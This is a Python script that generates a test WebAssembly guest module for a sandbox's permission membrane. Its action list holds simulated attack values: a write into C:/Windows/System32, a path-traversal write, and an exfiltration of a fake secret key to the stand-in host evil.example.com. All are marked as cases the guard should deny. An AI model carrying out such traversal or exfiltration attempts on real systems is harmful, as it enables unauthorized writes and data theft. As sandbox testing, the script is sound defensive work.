#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MetaSpace.Bio Engine Project — WebAssembly guest builder

Generates an 'untrusted app' guest WebAssembly module (guest_app.wat). The guest has
ZERO ambient authority: no WASI, no syscalls, no `open`. Its ONLY channel to the outside
world is the host-granted import gate:
    host_fs_write(path_ptr, path_len, data_ptr, data_len) -> i32
    host_net_out (host_ptr, host_len, data_ptr, data_len) -> i32

The guest chooses the TARGETS itself (so the strings live in the guest's data segments) —
exactly like a real malicious generated app. The membrane (membrane.py) decides whether
each gate call passes (via core.guard).

This file is the guest's DETERMINISTIC source: offsets/lengths are computed, no manual
byte counting. Output: guest_app.wat.
"""

import os

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "guest_app.wat")

# The effects the guest attempts (kind, arg1, arg2).
# fs: (path, data) ; net: (host, payload)
ACTIONS = [
    ("fs",  "out/app_output.txt",            "guest-wrote-this"),   # IN-SCOPE  -> ALLOW
    ("fs",  "C:/Windows/System32/evil.txt",  "pwned"),              # system    -> DENY
    ("fs",  "../../another-app/steal.txt",   "exfil"),              # traversal -> DENY
    ("net", "api.allowed.com",               "telemetry"),          # allowed   -> ALLOW
    ("net", "evil.example.com",              "secret-key-abc123"),  # exfil     -> DENY
]


def build():
    # --- memory layout: each string at a unique, 16-aligned offset ---
    blobs = []          # (offset, bytes)
    layout = []         # (kind, path_off, path_len, data_off, data_len)
    cur = 16            # leave the area around 0 free
    def place(s: str):
        nonlocal cur
        b = s.encode("utf-8")
        off = cur
        blobs.append((off, b))
        cur += (len(b) + 15) // 16 * 16   # 16-alignment
        return off, len(b)

    for kind, a1, a2 in ACTIONS:
        o1, l1 = place(a1)
        o2, l2 = place(a2)
        layout.append((kind, o1, l1, o2, l2))

    # --- WAT text ---
    lines = []
    lines.append("(module")
    lines.append('  (import "env" "host_fs_write" (func $fs (param i32 i32 i32 i32) (result i32)))')
    lines.append('  (import "env" "host_net_out"  (func $net (param i32 i32 i32 i32) (result i32)))')
    lines.append('  (memory (export "memory") 1)')
    # data segments (the guest's own targets)
    for off, b in blobs:
        esc = "".join("\\%02x" % c for c in b)
        lines.append('  (data (i32.const %d) "%s")' % (off, esc))
    # run: calls the gates in order, dropping the results
    lines.append('  (func (export "run")')
    for kind, o1, l1, o2, l2 in layout:
        callee = "$fs" if kind == "fs" else "$net"
        lines.append("    (drop (call %s (i32.const %d) (i32.const %d) (i32.const %d) (i32.const %d)))"
                     % (callee, o1, l1, o2, l2))
    lines.append("  )")
    lines.append(")")
    wat = "\n".join(lines) + "\n"

    with open(OUT, "w", encoding="utf-8") as fh:
        fh.write(wat)
    return OUT, layout


if __name__ == "__main__":
    path, layout = build()
    print("guest WAT written:", path)
    print("attempted effects:", len(layout))
